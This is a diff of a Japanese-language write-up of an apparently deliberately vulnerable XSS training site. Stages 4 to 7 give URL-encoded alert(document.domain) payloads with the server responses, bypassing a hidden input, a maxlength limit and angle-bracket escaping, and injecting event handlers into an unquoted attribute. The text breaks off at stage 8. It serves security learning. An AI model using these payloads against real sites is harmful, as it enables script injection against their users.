@@ -133,16 +133,74 @@ p1=a&p2=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
 ```
 ![image](https://user-images.githubusercontent.com/56021519/103072714-7403fb00-4609-11eb-8e86-d7cba0dddb0e.png)   
 
-### 4
-
-
-
-
-
-
-
-
-
-
-
-
+### 4 (bypas \<input type="hidden" value="">)
+![image](https://user-images.githubusercontent.com/56021519/103072902-e2e15400-4609-11eb-8d2e-27f8f22a8bef.png)   
+hackmeというパラメータが送信されている。   
+```txt
+p1=aaa&p2=Japan&p3=hackme
+```
+`"><script>alert(document.domain);</script>`をhackmeの後に着けると成功！   
+```txt
+p1=a&p2=Japan&p3=hackme%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
+```
+```txt
+</select>
+<input type="hidden" name="p3" value="hackme">
+<script>alert(document.domain);</script>
+">
+<hr class=red>
+```
+### 5 (bypass maxlength="15")
+![image](https://user-images.githubusercontent.com/56021519/103073265-af52f980-460a-11eb-918b-b241b0f53785.png)   
+以下を送信してみる。   
+```txt
+p1=aaa%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
+```
+以下が返る。`maxlength="15"`に設定されているのでBurpから編集する。   
+```txt
+<form action="?sid=950789ec9535788b7bc7651d8b31bd7b63c3ecb9" method="post">
+<hr class=red>No results for your Query. Try again: <input type="text" name="p1" 
+maxlength="15" size="30" value="aaa<script>alert(document.domain);</script>"> 
+<input type="submit" value="Search">
+```
+さっきと同じで成功！   
+```txt
+p1=aaa%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
+```
+### 6 (fileter "<>")
+![image](https://user-images.githubusercontent.com/56021519/103073664-56379580-460b-11eb-8659-4a5f39796123.png)   
+以下を送信する。   
+```txt
+p1=aaa%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
+```
+以下が返るので、`<>`がエスケープされてる。   
+```txt
+<form action="?sid=222f0be5885c36dac3576a0821f5c018691232fa" method="post">
+<hr class=red>No results for your Query. Try again: <input type="text" name="p1" 
+size="50" value="aaa&lt;script&gt;alert(document.domain);&lt;/script&gt;"> <input 
+type="submit" value="Search">
+```
+以下で成功！   
+```txt
+" onclick="alert(document.domain);
+```
+### 7 (inject \<input value= > with no quote)
+![image](https://user-images.githubusercontent.com/56021519/103073917-d231dd80-460b-11eb-9dd9-76c646bfc5af.png)   
+さっきと同じやつを送信してみる。   
+```txt
+p1=%22+onclick%3D%22alert%28document.domain%29%3B
+```
+`"`,`'`が使えない。   
+```txt
+<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=&quot; onclick=&quot;alert(document.domain);> <input type="submit" value="Search">
+```
+よく見ると`value=aaaa`となっていて`"`がない。   
+```txt
+<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=aaaaaa> <input type="submit" value="Search">
+```
+`hogehoge onmouseover=alert(document.domain)`のようにスペースを入れると普通に成功！   
+```txt
+<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=hogehoge onmouseover=alert(document.domain)> <input type="submit" value="Search">
+```
+### 8
+![image](https://user-images.githubusercontent.com/56021519/103074774-a3b50200-460d-11eb-9be0-0634932f4d3d.png)   
